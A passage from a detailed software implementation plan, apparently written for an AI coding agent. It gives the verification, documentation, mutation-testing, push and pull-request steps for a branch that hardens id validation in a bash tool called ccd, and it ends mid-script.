- `server-docstrings-call-ccds-predicate-dot-only`: two server docstrings still call ccd's predicate dot-only, carried
  to the next wave that edits those files.
- `expire-v1-note-ships-it-inert`: workspace lifecycle's text, reported to that programme.

**Found while building, per task.**
- No task recorded a departure beyond those above.
```

Then correct the block to the tip:
- **(a)** Every number and name in it, against Step 0 and Step 3 (e): the cap paragraph follows any operator reversal exactly as Step 3 (a) did, and then names `ids-over-128-invisible-to-the-hook-peer-census` among the residuals.
- **(b)** The conditional residuals follow Step 3 (d): the same bullets are deleted in both records.
- **(c)** "Found while building, per task": compare Step 0's slug list from the ledger with the slugs already in the note. For each task (1 to 11) whose ledger entry names a slug that is not yet in the note, add one bullet: `Task <k>: \`<slug>\`, \`<slug>\`.`, plus one plain sentence per slug saying what changed, measured against the tip. If any such bullet is added, delete the line "No task recorded a departure beyond those above."
- **(d)** No phrase from the earlier notes that `collect-lane-prose.test.ts` forbids may appear (its note slice runs to the end of the file): not "Left open for the coordinator's ruling", and not "that call's late answer is dropped."

```bash
sed -n '/^### §17 as built (path-identity W1b/,$p' docs/superpowers/programs/child-reclamation-contract.md | grep -cE 'D-[0-9]|[0-9]{4} ?(–|\.\.|-) ?[0-9]{4}'   # 0
sed -n '/^### §17 as built (path-identity W1b/,$p' docs/superpowers/programs/child-reclamation-contract.md | grep -c '<n>'                                    # 0
```

- [ ] **Step 6: Run the prose test and see it pass**

```bash
cd server && ./node_modules/.bin/vitest run test/path-identity-w1b-prose.test.ts
```

Expected: PASS, 8 of 8.

- [ ] **Step 7: Run every suite that reads either document, plus the ledger and publicness guards.** None of these is edited by this task except the new file.

```bash
(cd server && grep -l '2026-10-12-path-identity-design\|child-reclamation-contract' test/*.ts)          # expected: collect-lane-prose.test.ts and path-identity-w1b-prose.test.ts; run every file it lists
(cd server && ./node_modules/.bin/vitest run test/path-identity-w1b-prose.test.ts test/collect-lane-prose.test.ts test/ccd-id-cap.test.ts test/deviation-refs.test.ts test/dtbd.test.ts test/topology-clean.test.ts)
git diff -U0 HEAD -- docs/superpowers/specs/2026-10-12-path-identity-design.md docs/superpowers/programs/child-reclamation-contract.md | grep '^+' | grep -cE 'D-[0-9]|[0-9]{4} ?(–|\.\.|-) ?[0-9]{4}'   # 0
git diff -U0 HEAD -- docs/superpowers/specs/2026-10-12-path-identity-design.md docs/superpowers/programs/child-reclamation-contract.md | grep '^+' | grep -cE '/home/|/mnt/|\.ts\.net|100\.[0-9]+\.[0-9]+\.[0-9]+'   # 0: no box path, tailnet name or address
git diff --name-only HEAD                                                            # exactly the spec, the contract and (untracked, so shown by git status) the new test
```

Expected:
- PASS for every suite. `collect-lane-prose.test.ts` reads the rulings file from "§16 as built" to the end of the file, so this wave's note is inside its slice. It must stay green with no edit: there is no deviation token and none of its forbidden phrases.
- `topology-clean` is the publicness ratchet over every tracked file. A red there means a private name or path got into the prose: remove it, never excuse it.
- Run each test under its own timeout of at least 600000 ms, in the foreground. Re-run a CLAUDE.md load flake on its own before calling it a break.

- [ ] **Step 8: Mutation table.** Apply each mutation alone, run `./node_modules/.bin/vitest run test/path-identity-w1b-prose.test.ts` from `server/`, see the red, then revert by editing. The red texts were drafted, not measured, so measure them.

| # | Mutation | Expected red |
|---|---|---|
| T12.1 | Spec: the heading `### 2.9 As built (W1b)` becomes `### 2.9 As built` | "§2.9 stands after §2.8…": `§2.9 is missing: expected -1 to be greater than <n>`, and every other spec case reds on `''` |
| T12.2 | Spec: `` `_REG_ID_MAX` is 128 `` becomes `` `_REG_ID_MAX` is 129 `` | "states the cap…": `expected '…' to contain '`_REG_ID_MAX` is 128'` |
| T12.3 | Spec: delete one left-out file's clause (or, if the table is empty, the sentence "The census left no file out.") | "names every file the name census left out": `<file>: expected '…' to contain '`<file>`'` |
| T12.4 | Spec: drop the word `only` from "decision fields only" | "states the corrections…": `bounded holds for the `--actor` and `--reason` decision fields only: expected '…' to contain …` |
| T12.5 | Spec: delete the `projects-over-64-get-no-hook-card` bullet | "names every stated residual": `projects-over-64-get-no-hook-card: expected '…' to contain …` |
| T12.6 | Spec: item 27's Status cell back to `Proposed` | "marks items 24 to 31…": `item 27: expected '…' to match …` |
| T12.7 | Spec: item 32's Status cell to `Built (W1b)` | "marks items 24 to 31…": `expected 9 to be 8` |
| T12.8 | Contract: delete the `dash-parity-in-its-own-file` bullet | "names every departure and residual…": `dash-parity-in-its-own-file: expected '…' to contain '`dash-parity-in-its-own-file`'` |
| T12.9 | Contract: add a deviation token (the letter D, a hyphen and four digits) to one sentence of the note. Type it in the scratch edit only, never in a committed file | "names every departure and residual…": `expected '…' not to match /\bD-\d/`. Also run `collect-lane-prose.test.ts`: "carries the wave’s as-built note…" reds the same way |
| T12.10 | Contract: move the note's heading and body above R98 | "stands in §17, after R98": `expected <at> to be greater than <r98>` |
| T12.11 | Contract: leave `<n>` in the heading | "stands in §17, after R98": `the as-built note is missing, or its heading names no run number: expected -1 to be greater than -1` |

Revert each one, then re-run Step 6: green. Confirm with `git diff --stat HEAD` that only the intended edits remain.

- [ ] **Step 9: Commit**

```bash
git add docs/superpowers/specs/2026-10-12-path-identity-design.md \
  docs/superpowers/programs/child-reclamation-contract.md \
  server/test/path-identity-w1b-prose.test.ts
git diff --cached --name-only                                                        # exactly those three
git commit -F - <<'EOF'
docs(path-identity): W1b as built

The spec gains §2.9, which records what W1b built for ccd's half of the
id fix: one id rule, _reg_id_ok; the identity pairs the eight --session
verbs take whole; stop's and ws-add's rules; the project predicate and
enable's project check; the dot rule at the token verbs and their two
audits; the composed-id cap derived from the name census and the hook's
id gate, in place of 222; and the reap lock taken only after an
advisory parse, with the registry peek that keeps "registered" first.
It corrects §2.4's surface, arity and "bounded" sentences, records the
§2.2 verdicts as measured on the pre-wave binary, and lists the stated
residuals. Items 24 to 31 of §7 are marked built.

The rulings file gains its W1b as-built note at the end of §17, which
names each departure and each residual by slug, with no number.

A new prose suite pins both records. It reads the cap, the hook's gates
and the census from the code, so a later change to any of them reds it
until the record follows.
EOF
```

---

### Task 13: Whole-branch verification and the PR

**Model routing:** `sonnet`, effort `high`.

**Files:**
- Create: none in the repository.
- Modify: none. There is one exception, Step 3's R9 fallback. It runs only with the coordinator's agreement recorded in the SDD ledger, and it makes one `docs(census)` commit, given in Step 3.
- Test: no new file. The task runs the whole server, agent and PWA suites, and the named guard files, unedited.
- Scratch: `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13/`. It is gitignored, never committed, and called `$L` below. Every command runs from the workspace root. Each Bash call sets `L` again, because shell state does not carry from one call to the next.

**Interfaces:**
- Consumes the eight `ccd/ccd` names exactly as §Interfaces spells them: `_reg_id_ok`, `_REG_ID_MAX`, `_reg_id_cap`, `_REG_ID_CAP_WHY`, `_ws_collect_slug_askable`, `_ws_collect_witness_judge`, `_ws_collect_records_judge` and `_ws_collect_prelock`. It also consumes the re-derived `_ws_tmproot_id_ok`, the thirteen new `server/test` files of Tasks 1 to 12 (Task 12 adds `path-identity-w1b-prose.test.ts`), and these Task 0 records in the ledger's `progress.md`: (c1) the `'ccd/ccd': <n>` line, Step 4's counts for both boxes, and Step 5's W and cap.
- Produces:
  - the suite verdict, which becomes the wave-done's `suite:` line;
  - the pushed branch tip;
  - the PR "Path identity W1b: ccd binds no flag-spelled id";
  - the wave-done mail `{"branchTip","prNumber","prPhase","handoffCommit"}`.
- No code interface is added.

- [ ] **Step 1: The base, then the FIRST full run after implementation, in the foreground**

The verdict of this run is the wave-done's `suite:` line (worker clause 15). Record it in the ledger before any fix. If a fix round turns it green later, `red` stays `red`.

First, check that the base has not moved under `ccd/ccd`. `ccd/ccd` edits merge one at a time, and the start-line table in Step 3 compares against the merge base.

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13; mkdir -p "$L"
git fetch origin main
git merge-tree --write-tree --name-only --no-messages HEAD origin/main >/dev/null; echo "mt rc=$?"     # 0: no conflict
BASE=$(git merge-base HEAD origin/main)
git diff --quiet "$BASE" origin/main -- ccd/ccd; echo "ccd-moved rc=$?"                               # 0: main has not touched ccd/ccd since this branch's base
git status --porcelain --untracked-files=no | wc -l                                                     # 0: no uncommitted tracked change
```

Expected: `mt rc=0`, `ccd-moved rc=0` and `0`.
- **If `mt rc=1` or `ccd-moved rc=1`:** absorb once with `git merge origin/main`. Never rebase.
  - On a `ccd/ccd` line-2 conflict, take either side of THAT LINE only, resolve every other hunk as source, and run `bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd`.
  - Then `git add ccd/ccd` and `git commit --no-edit`.
  - Re-point every by-content anchor the merge moved, re-run this block, and write the absorption to the ledger.
- **Any other `mt rc`** is unmeasured. It licenses nothing. STOP and report `merge-tree-unmeasured`.

The full run:

```bash
(cd server && npm ci && find test -name '*.test.ts' | wc -l)         # record as N_FILES
```

Run the next command once for each K from 1 to 24, setting `K` at the start of each call. Use one Bash call per K, in the foreground, with a timeout of 600000 ms:

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13; K=1
(cd server && ./node_modules/.bin/vitest run --shard="$K"/24) > "$L/shard-$K.log" 2>&1; echo "shard $K rc=$?"; tail -n 8 "$L/shard-$K.log"
```

Then:

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
grep -h 'Test Files' "$L"/shard-*.log | sed -E 's/.*\(([0-9]+)\).*/\1/' | awk '{s+=$1} END{print "shard files", s}'   # equals N_FILES
grep -l 'FAIL' "$L"/shard-*.log                                                                            # prints nothing when green
(cd agent && npm ci && npm run test)
(cd pwa && npm ci && npm run test)
```

Expected:
- every shard `rc=0`;
- `shard files` equals `N_FILES`;
- the `FAIL` grep prints nothing;
- agent and PWA PASS. Both are untouched by this wave, so they must be green unchanged.

Rules:
- Use one denominator for the whole set. If one shard runs past 600 s, re-run the whole set at `/48`, again one call per shard, and check the sum against `N_FILES` again.
- A red in one of CLAUDE.md's named load flakes is re-run alone before it counts as a break: `ccd-ws-gc`, `pr-sweep`, `session-hook`, `typecheck-tests`, `ccd-session-state`, `ccd-bounded-reads`, and the collector suites `ccd-ws-collect-*` and `ccd-collect-*`. The command is `(cd server && ./node_modules/.bin/vitest run test/<file>)`.
- A red that persists is measured on a clean `origin/main` in scratch, never in this tree: `M=$(mktemp -d) && git archive origin/main | tar -x -C "$M" && (cd "$M/server" && npm ci && ./node_modules/.bin/vitest run test/<file>); rm -rf "$M"`. If main is red too, report it once as `main-red` and leave it alone. If main is green, the red is this wave's. STOP, and report it by its file name and a slug.
- Write to the ledger: `N_FILES`, each shard's `Test Files` line, the agent and PWA lines, and the verdict word (`green` or `red`).

- [ ] **Step 2: Type-check, and the deviation and token cross-checks**

```bash
(cd server && ./node_modules/.bin/tsc --noEmit -p .); echo "tsc rc=$?"
git fetch origin main
(cd server && ./node_modules/.bin/vitest run test/deviation-refs.test.ts test/dtbd.test.ts test/typecheck-tests.test.ts test/ownership.test.ts test/mark-check.test.ts test/ccd-refusal-scan.test.ts test/single-definition.test.ts test/topology-clean.test.ts test/collect-readers.test.ts test/wsaudit.test.ts)
git log origin/main..HEAD --format=%B | grep -cE 'D-[0-9]'
git log origin/main..HEAD --format=%B | grep -cE '[0-9]{4} ?(–|\.\.|-) ?[0-9]{4}'
git diff origin/main...HEAD | grep -nE '^\+.*D-[0-9]+ ?(–|\.\.|-) ?(D-)?[0-9]+'
git diff origin/main...HEAD -- ccd server/test | grep -cE '^\+.*\bD-[0-9]'
git diff origin/main...HEAD | grep -nE '^\+.*(\.ts\.net|/(home|Users)/[A-Za-z])'
```

Expected:
- `tsc rc=0`;
- the ten vitest files PASS: `typecheck-tests` type-checks the new test files, `topology-clean` scans for host names, and `collect-readers` and `wsaudit` show the word sets are unchanged;
- each of the three `grep -c` lines prints `0`;
- both `grep -n` lines print nothing.

A `D-` token added in `ccd` or `server/test` is not edited here. STOP, and report it as `d-token-in-the-diff`, quoting the line. The same goes for a host or home-path line, reported as `private-path-in-the-diff`.

- [ ] **Step 3: The frozen corpus, the stamp, and the single definitions**

**(3a) The five citation passes and the census number.** `session-hook.test.ts` is never edited, so the number must match Task 0's.

```bash
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
grep -n "'ccd/ccd': [0-9]*," server/test/session-hook.test.ts
git show origin/main:server/test/session-hook.test.ts | grep -n "'ccd/ccd': [0-9]*,"
git diff --quiet origin/main...HEAD -- server/test/session-hook.test.ts; echo "session-hook untouched rc=$?"
```

Expected:
- PASS;
- both `grep -n` lines print the same `'ccd/ccd': <n>,` with the number Task 0's (c1) recorded (147 at the export);
- `rc=0`.

If origin/main's number differs from (c1), a lane merged since Task 0 moved it. Record that, and compare HEAD with origin/main's line instead.

**(3b) The start-line table.** R15 puts the id helpers directly above `# THE ID A WITNESS MAY BE NAMED FOR`. That line is below every corpus anchor (`:19131`) but above `cmd_start()`. So the table has two zones:
- Zone A: every function that starts above that line keeps its start line exactly.
- Zone B: every function between that line and `cmd_start()` moves by ONE common shift, which is the lines the R15 block added.

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
BASE=$(git merge-base HEAD origin/main); git show "$BASE":ccd/ccd > "$L/ccd.base"
W=$(grep -n '^# THE ID A WITNESS MAY BE NAMED FOR' "$L/ccd.base" | cut -d: -f1); echo "W=$W"; [ "$W" -gt 19131 ] && echo "helpers below every corpus anchor"
awk '/^cmd_start\(\) \{/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{n=$0; sub(/\(\).*/,"",n); print n, NR}' "$L/ccd.base" | LC_ALL=C sort -k1,1 > "$L/base.starts"
awk '/^cmd_start\(\) \{/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{n=$0; sub(/\(\).*/,"",n); print n, NR}' ccd/ccd | LC_ALL=C sort -k1,1 > "$L/head.starts"
LC_ALL=C join "$L/base.starts" "$L/head.starts" | awk -v w="$W" '{d=$3-$2; if ($2<w) {if (d!=0) {print "MOVED-ABOVE", $0; bad=1}} else {if (zb=="") zb=d; else if (d!=zb) {print "UNEVEN-BELOW", $0; bad=1}}} END{print "zone A unmoved; zone B shift", zb; exit bad}'; echo "starts rc=$?"
LC_ALL=C join -v1 "$L/base.starts" "$L/head.starts"
LC_ALL=C join -v2 "$L/base.starts" "$L/head.starts" | cut -d' ' -f1
echo "cmd_start shift $(( $(grep -n '^cmd_start() {' ccd/ccd | cut -d: -f1) - $(grep -n '^cmd_start() {' "$L/ccd.base" | cut -d: -f1) ))"
```

Expected:
- `helpers below every corpus anchor`;
- no `MOVED-ABOVE` or `UNEVEN-BELOW` line, and `starts rc=0`;
- `join -v1` prints nothing, so no function above `cmd_start()` vanished;
- `join -v2` prints exactly `_reg_id_cap` and `_reg_id_ok`;
- `cmd_start shift` equals the zone B shift.

Write the table's result to the ledger, and confirm the ledger holds Task 4's record that no corpus anchor falls in ws-rename's shifted span (R9). If that record is missing, STOP and report `ws-rename-span-unrecorded`.

**(3c) The id checks, the canonical texts, and the eight names.**

```bash
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd
awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{fn=$0; sub(/\(\).*/,"",fn)} /\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]/{print fn}' ccd/ccd | tr '\n' ' '; echo
grep -cxF '_reg_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != -* ]]; }   # word -> 0 iff a --session or positional id may bind it' ccd/ccd
grep -cxF '_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 iff a witness, a token verb or its audit may name it' ccd/ccd
grep -cxF '  [[ "$1" != -* ]] || return 1' ccd/ccd
grep -nE '^_REG_ID_MAX=[0-9]+' ccd/ccd
grep -cE '_reg_id_cap "[^"]*" \|\| die "\$_REG_ID_CAP_WHY — ' ccd/ccd
grep -c 'so that every name ccd derives from it fits the 255-byte name limit' ccd/ccd
grep -c 'names no project and slug, so whether its slug is free cannot be asked' ccd/ccd
```

Expected, line by line:
1. `5`.
2. `cmd_ws_attic cmd_pr_open cmd_ws_audit cmd_ws_reap cmd_forget`. These are the stated residual `verbs-outside-sec1-keep-the-inline-regex`, and `cmd_ws_audit`'s line is R22's `--reclaim`-only form.
3. `1`.
4. `1`.
5. `1`.
6. One line, whose value equals the cap Task 0's Step 5 recorded: 128 under R27 (a), unless the brief carried a reversal.
7. `3`: ws-add, start and enable.
8. `1`.
9. `1`.

A different count is not edited here. Name it by slug in the wave-done and STOP.

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
grep -oE '^[A-Za-z_][A-Za-z0-9_]*(\(\)|=)' "$L/ccd.base" | sed -E 's/(\(\)|=)$//' | LC_ALL=C sort -u > "$L/base.names"
grep -oE '^[A-Za-z_][A-Za-z0-9_]*(\(\)|=)' ccd/ccd | sed -E 's/(\(\)|=)$//' | LC_ALL=C sort -u > "$L/head.names"
LC_ALL=C comm -13 "$L/base.names" "$L/head.names" | tr '\n' ' '; echo
LC_ALL=C comm -23 "$L/base.names" "$L/head.names"
for n in _reg_id_ok _REG_ID_MAX _reg_id_cap _REG_ID_CAP_WHY _ws_collect_slug_askable _ws_collect_witness_judge _ws_collect_records_judge _ws_collect_prelock; do printf '%s %s\n' "$n" "$(grep -c "$n" ccd/ccd)"; done
awk '/^cmd_caps\(\) \{/{f=1} f{print} f&&/^}/{exit}' "$L/ccd.base" > "$L/caps.base"; awk '/^cmd_caps\(\) \{/{f=1} f{print} f&&/^}/{exit}' ccd/ccd > "$L/caps.head"; cmp "$L/caps.base" "$L/caps.head" && echo "cmd_caps identical"
```

Expected:
- `comm -13` prints only names from the eight. `_REG_ID_CAP_WHY` appears only if Task 7 initialised it at top level. The other seven must all appear.
- `comm -23` prints nothing.
- Every one of the eight shows a non-zero count.
- `cmd_caps identical`, so no capability word was added.

A new top-level name outside the eight breaks the HARD BOUNDARY. STOP and report `name-outside-the-eight`.

**(3d) The stamp, syntax, and the doctor comment.**

```bash
bash -n ccd/ccd; echo "ccd syntax rc=$?"
node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"
bash -n ccd/ccrc-doctor-checks; echo "doctor syntax rc=$?"
git diff --numstat origin/main...HEAD -- ccd/ccrc-doctor-checks
```

Expected:
- all three `rc=0`;
- the numstat line reads `1	1	ccd/ccrc-doctor-checks`, or any equal added and removed pair: line-neutral.

**(3e) The R9 fallback, only if (3a) or (3b) is red.**
1. Do not edit any number. STOP, and mail the coordinator the failing pass's dump and the `'ccd/ccd'` numbers from HEAD and from origin/main.
2. Only with their agreement recorded in the SDD ledger, re-measure the census in the S6-R11 shape. That means a composition note above the `'ccd/ccd':` line, saying "RE-MEASURED against the tree, never adjusted to keep a number green; no rule changed", with the stated, base and tree numbers.
3. Then make one commit: `git add server/test/session-hook.test.ts`, with the subject `docs(census): re-measure the ccd/ccd citation census after path-identity W1b` and the body `Line-neutrality could not be kept at <function>; the census is re-measured against the tree with a composition note, as the coordinator agreed. No number was edited to go green.` Re-run (3a).
4. Step 4's modified-file list then has `session-hook.test.ts` as a fourth entry.

- [ ] **Step 4: The hard boundary**

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
git diff --name-only origin/main...HEAD | grep -vE '^(ccd/ccd|ccd/ccrc-doctor-checks|docs/superpowers/specs/2026-10-12-path-identity-design\.md|docs/superpowers/programs/child-reclamation-contract\.md|docs/superpowers/plans/2026-10-12-path-identity-w1b-[a-z0-9-]+\.md)$|^server/test/'
git diff --name-only origin/main...HEAD -- docs/superpowers/plans/
git diff --diff-filter=DR --name-only origin/main...HEAD
git diff --diff-filter=M --name-only origin/main...HEAD -- server/test
git diff --diff-filter=A --name-only origin/main...HEAD -- server/test | LC_ALL=C sort > "$L/added-tests"
printf '%s\n' server/test/dashIdFixture.ts server/test/ccd-reg-id-ok.test.ts server/test/ccd-token-verbs-dash-id.test.ts server/test/ccd-stop-dash-id.test.ts server/test/ccd-session-verbs-dash-id.test.ts server/test/ccd-project-dash.test.ts server/test/ccd-ws-add-dash-id.test.ts server/test/ccd-id-cap.test.ts server/test/ccd-token-verbs-dot-id.test.ts server/test/ccd-collect-prelock.test.ts server/test/ccdargv-dash-id-parity.test.ts server/test/ccd-collect-header-prose.test.ts server/test/path-identity-w1b-prose.test.ts | LC_ALL=C sort | diff - "$L/added-tests" && echo "added tests exact"
git diff --name-only origin/main...HEAD -- server/src shared agent pwa deploy ccd/ccrc ccd/session-hook.sh ccd/compact-card.mjs ccd/ccd-entry.py ccd/coordinator-skill ccd/worker-skill ccd/reviewer-skill README.md CLAUDE.md docs/superpowers/programs/path-identity.md docs/superpowers/specs/2026-09-09-graphify-compaction-card-design.md docs/superpowers/plans/2026-09-10-graphify-compaction-card-plan-a.md server/test/session-hook.test.ts server/test/single-definition.test.ts server/test/ccd-ws-reap.test.ts server/test/ccd-wsaudit-nonpoison.test.ts server/test/ccdargv-dec-parity.test.ts
git ls-files .superpowers | wc -l
```

Expected:
- The first command prints nothing.
- The plans listing prints at most one path, this plan's own file, committed as the brief directs. It prints none if the brief landed the plan on `main`.
- `DR` prints nothing.
- `M` prints exactly `server/test/ccd-actor-flags.test.ts`, `server/test/ccd-project-pool.test.ts`, `server/test/ccd-workspaces.test.ts` and `server/test/pool-name-parity.test.ts`. Under (3e) it also prints `server/test/session-hook.test.ts`.
- `added tests exact`.
- The never-edit listing prints nothing. Under (3e) it prints `server/test/session-hook.test.ts` alone.
- `0`, because the ledger is gitignored and never committed.

Workspace-lifecycle's text must come through byte-identical:

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
awk '/^_ws_expire_locked\(\) \{/{f=1} f{print} f&&/^}/{exit}' "$L/ccd.base" > "$L/expire-locked.base"
awk '/^_ws_expire_locked\(\) \{/{f=1} f{print} f&&/^}/{exit}' ccd/ccd > "$L/expire-locked.head"
cmp "$L/expire-locked.base" "$L/expire-locked.head" && echo "_ws_expire_locked identical"
awk '/^# EXPIRE-V1\./{f=1} f&&!/^#/{exit} f{print}' "$L/ccd.base" > "$L/expire-v1.base"
awk '/^# EXPIRE-V1\./{f=1} f&&!/^#/{exit} f{print}' ccd/ccd > "$L/expire-v1.head"
cmp "$L/expire-v1.base" "$L/expire-v1.head" && echo "EXPIRE-V1 note identical"
grep -c 'this wave ships it inert' ccd/ccd
```

Expected: both `identical` lines, and `1`. That one copy is EXPIRE-V1's, which is reported to its programme as `expire-v1-note-ships-it-inert`. Task 11 removed COLLECT-V1's copy.

Task 12's docs landed where R24 puts them:

```bash
S=docs/superpowers/specs/2026-10-12-path-identity-design.md
grep -c '^### 2\.9 As built (W1b)' "$S"
grep -cE '^\| (2[4-9]|3[01]) \|[^|]*\|[^|]*\|[^|]*\| Built \(W1b\) \|' "$S"
grep -c '^### §17 as built (path-identity W1b, run [0-9]*)' docs/superpowers/programs/child-reclamation-contract.md
git log --no-merges --format=%s origin/main..HEAD
```

Expected:
- `1`, then `8`, then `1`.
- The log lists one commit per task, Tasks 1 to 12, each with its plan subject. Any other non-merge commit is either the plan file's, as the brief directs, or (3e)'s census commit. Copy the list into the PR body.

- [ ] **Step 5: Push and open the PR**

```bash
git push -u origin HEAD; echo "push rc=$?"
test "$(git ls-remote origin "refs/heads/$(git branch --show-current)" | cut -f1)" = "$(git rev-parse HEAD)" && echo "remote tip is HEAD"
```

Expected: `push rc=0` and `remote tip is HEAD`.

A pre-push hook refusal is never bypassed: never use `--no-verify` and never force-push. STOP, and report the hook's message, with no names, by slug `pre-push-refused`.

Write the body to `$L/pr-body.md` with the Write tool, from this template. Fill every `{{…}}` slot from the ledger. Delete a bullet whose slot has nothing to say. Write no host, no home path, no private project, no account or lane name, and no docserver or Linear link.

```markdown
Wave 2 of 4 of the path-identity programme (spec `docs/superpowers/specs/2026-10-12-path-identity-design.md`, sections 2.1 to 2.8; as built in 2.9).

**Deploy class: AGENT-FIRST. The fleet box moves first**, which is `ccrc rollout`'s default order. The server box needs nothing from this wave.

### What changed (one commit per task)
- Task 1: `_reg_id_ok`, the one rule for an id a verb may bind: the registry charset under `LC_ALL=C`, never dash-leading.
- Task 2: ws-reclaim, ws-expire and ws-collect take `--session` and their token keys as whole pairs, and refuse a dash-leading id before any lock.
- Task 3: stop refuses a dash-leading `--surface` value, a dash-leading residue token, and a composed id `_reg_id_ok` refuses.
- Task 4: ws-release, ws-archive, ws-restore, ws-hold and ws-rename take their identity pairs whole (line-neutral).
- Task 5: no project or temp-root id begins with a dash; `enable`'s two-argument form validates its wrapper and its project before it journals or locks.
- Task 6: ws-add refuses a second `--actor` and a dash-leading `--surface` value (line-neutral).
- Task 7: `_REG_ID_MAX` = {{cap}}, from the derived-name census (widest overhead {{W}}) and the hook's id gate; each of ws-add, start and enable dies before anything is created.
- Task 8: ws-reclaim, ws-expire, ws-collect and the two token audits refuse a dot-leading id at entry.
- Task 9: the collector opens `.reap-<id>.lock` only after an advisory parse; a registry peek keeps `registered` ahead of `witness-mismatch`.
- Task 10: real-binary parity: no dash-leading id redirects a verb the server composes.
- Task 11: the collector header's pause rung, one grace, and how the lane is armed (line-neutral).
- Task 12: the spec's 2.9 and section 7 status cells; the contract's "§17 as built".

### Boundary
`ccd/ccd` (restamped with `bash ccd/ccrc restamp ccd/ccd`); one line-neutral comment in `ccd/ccrc-doctor-checks`; thirteen new files under `server/test/`, and four existing ones edited only where a pinned behaviour inverts or a comment became false (`ccd-actor-flags`, `ccd-project-pool`, `ccd-workspaces`, `pool-name-parity`); the spec and the contract's as-built note; this plan. No server, shared, agent, PWA or deploy source; no route, table, capability word, ccd verb, agent grant or wire field.

### Suite
- suite: {{green|red}} on the first full run after implementation: {{N_FILES}} server test files in 24 shards; agent and PWA green unchanged.
- Citation census `'ccd/ccd'` unchanged at {{n}}; every function above the id helpers keeps its start line, and the ones between them and `cmd_start` move by one common {{shift}}.

### Entry counts (numbers only)
- fleet box: {{Task 0 Step 4 line}}
- server box: {{the brief's line}}

### Stated residuals
- `dot-rule-only-at-the-token-verbs`, `verbs-outside-sec1-keep-the-inline-regex`, `enable-one-arg-journals-an-unchecked-id`, `hand-planted-ids-over-the-cap`, `projects-over-64-get-no-hook-card`, `btime-less-witness-takes-the-lock`, `server-docstrings-call-ccds-predicate-dot-only`, `expire-v1-note-ships-it-inert`.
- `files-outside-the-name-census`: {{each CENSUS_EXCLUDED file, with its reason}}.

### Departures (by slug; numbers are assigned at the fix round)
- `surface-dash-rule-at-stop-and-ws-add-only`, `dot-rule-extends-to-the-two-audits`, `reg-id-ok-under-lc-all-c`, `stop-checks-its-residue-and-composed-id`, `ws-add-refuses-a-second-actor`, `ws-hold-reason-stays-unbounded`, `id-cap-from-the-name-census`, `enable-validates-its-project`, `collect-registry-peek-before-the-lock`, `section-2-2-verdicts-measured-at-task-10`, `dash-parity-in-its-own-file`, `collect-verb-prelock-refusal-precedes-the-pause`, `start-line-table-splits-at-the-id-helpers`.
- Found during the wave: {{each slug the ledger names}}.

🤖 Generated with [Claude Code](https://claude.com/claude-code)
```

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
grep -c '{{' "$L/pr-body.md"
grep -nE '\.ts\.net|(^|[^0-9.])100\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|/(home|Users)/[A-Za-z]|linear\.app|D-[0-9]' "$L/pr-body.md"
gh pr create --base main --head "$(git branch --show-current)" --title "Path identity W1b: ccd binds no flag-spelled id" --body-file "$L/pr-body.md"
gh pr view --json number,url --jq '.number'
```

Expected:
- `0`;
- the scan prints nothing;
- the PR is created, and its number is printed. Record it in the ledger.

If the body needs a later correction, PATCH it over REST rather than with `gh pr edit`.

- [ ] **Step 6: The wave-done, per the worker skill, in the same turn as the push**

Never end a turn to wait for CI: CI is the coordinator's re-measure. Before sending, list mail. A coordinator mail that changes the wave is acted on first, and the tip is measured afresh afterwards.

Write `$L/wave-done-prose.md` with the Write tool. It holds:
- the PR number;
- `N_FILES` and the shard sum;
- the citation number and the zone B shift;
- the entry counts for both boxes (numbers only);
- the cap and W;
- each stated residual and each departure, by slug;
- any STOP or `main-red`.

Then run one Bash call. Set `RUN` to the run id the dispatch brief names, `SUITE` to Step 1's recorded word, and `FAILURE` to empty, or to `shallow`, `ceiling` or `unclear` when a check failed (clause 15):

```bash
L=.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/task13
RUN=0; SUITE=green; FAILURE=
API="$HOME/.local/bin/ccrc-api"
who=$("$API" whoami) || { printf 'identity refused: %s\n' "$who" >&2; exit 1; }
id=${who#*\"id\":\"};     id=${id%%\"*}
uuid=${who#*\"uuid\":\"}; uuid=${uuid%%\"*}
[[ -n "$id" && -n "$uuid" && "$RUN" != 0 ]] || { echo 'identity or run id missing' >&2; exit 1; }
"$API" mail list --to "$id"
TIP=$(git rev-parse HEAD)
test "$(git ls-remote origin "refs/heads/$(git branch --show-current)" | cut -f1)" = "$TIP" || { echo 'remote tip is not HEAD' >&2; exit 1; }
PR=$(gh pr view --json number --jq '.number')
PHASE=$(gh pr view --json state,isDraft --jq 'if .isDraft then "draft" elif .state=="OPEN" then "open" elif .state=="MERGED" then "merged" elif .state=="CLOSED" then "closed" else "unknown" end')
node -e '
const fs = require("fs");
const [id, uuid, run, suite, failure, tip, pr, phase, prose] = process.argv.slice(1);
